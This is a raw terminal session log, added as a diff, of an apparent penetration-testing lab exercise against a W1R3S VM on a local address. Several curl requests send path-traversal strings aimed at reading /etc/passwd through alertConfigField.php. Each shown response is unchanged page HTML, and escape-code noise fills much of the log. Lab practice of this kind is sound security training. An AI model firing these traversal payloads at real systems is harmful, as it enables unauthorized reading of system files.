@@ -1,0 +1,671 @@
+Script started on 2020-09-27 20:50:33-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="166" LINES="32"]
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# cursl[K[Kl http://192.168.1.109/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-encode[K[K[K[K[K[Kurlencode urlcoin[K[K[K[K[K[K[Kurlconfig=./[K[K../../../../../../../etc/passwd
+curl: no URL specified!
+curl: try 'curl --help' or 'curl --manual' for more information
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?urlConfig=[K[K[K[K[K[K[K[K[K[K
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.asswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.asswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Casswd http://192.168.1.109/administrator/alerts/aler[1PtConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Casswd http://192.168.1.109/administrator/alerts/alert[1PConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/asswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpasswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cepasswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctpasswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccpasswd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C.etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# 
+]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../etc/p/../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ctc/p/../../etc/passwd http://192.168.1.109/administrator/a[1Plerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cc/p/../../etc/passwd http://192.168.1.109/administrator/al[1Perts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/p/../../etc/passwd http://192.168.1.109/administrator/ale[1Prts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cp/../../etc/passwd http://192.168.1.109/administrator/aler[1Pts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/../../etc/passwd http://192.168.1.109/administrator/alert[1Ps/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C./../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../../../../etc/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/passwd http://192.168.1.109/administrator/aler[1Pts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
+</div>]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# curl -s --data-urlencode urlconfig=../../../../../../../../../../et/passwd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccd http://192.168.1.109/administrator/alerts/alertConfigField.php?[A]0;root@Pentest: /home/joaofracassi/beco-xpl/w1r3s.v1.0[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/w1r3s.v1.0[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+<style>
+    .new_content{
+        position: fixed;
+    }
+    .alert_config_field{
+    	font-size:12px;
+    	background:#FFF;
+    	position:relative;
+    	border-radius: 3px;
+    	box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
+    	overflow:hidden;
+    	position:fixed;
+    	top:50%;
+    	left:50%;
+        width:600px;
+    	height:440px;
+    	margin-left:-300px;
+    	margin-top:-220px;
+    }
+    .alert_config_top{
+        position: relative;
+        margin: 2px;
+        margin-bottom: 0px;
+        border: 1px solid #D2D2D2;
+        background: #4489F8;
+        overflow: auto;
+        color:#FFF;
+        font-size: 13px;
+        padding: 7px 5px;
+        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
+        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+    }
+    .description_alert{
+    	position:relative;
+    	font-size:12px;
+        text-shadow:0 1px #FFFFFF;
+        font-weight: normal;
+        padding: 5px 0px 5px 0px;
+    }
+    .btnClose_alert{
+    	position:absolute;
+        top: 4px; right: 2px;
+    	width:22px;
+    	height:22px;
+    	cursor:pointer;
+        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
+        background-position: center;
+        background-size: 13px;
+    }
+    .content_alert_config{
+    	position:relative;
+    	clear:both;
+        margin: 2px;
+        margin-top: 0px;
+        height: 401px;
+        padding: 10px;
+        overflow: auto;
+    }
+</style>
+<script>
+	function CloseDefaultAlert(){
+		cuppa.setContent({'load':false, duration:0.2});
+        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
+	}
+</script>
+<div class="alert_config_field" id="alert">
+    <div class="alert_config_top">
+        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
+    </div>
+    <div id="content_alert_config" class="content_alert_config">
+            </div>
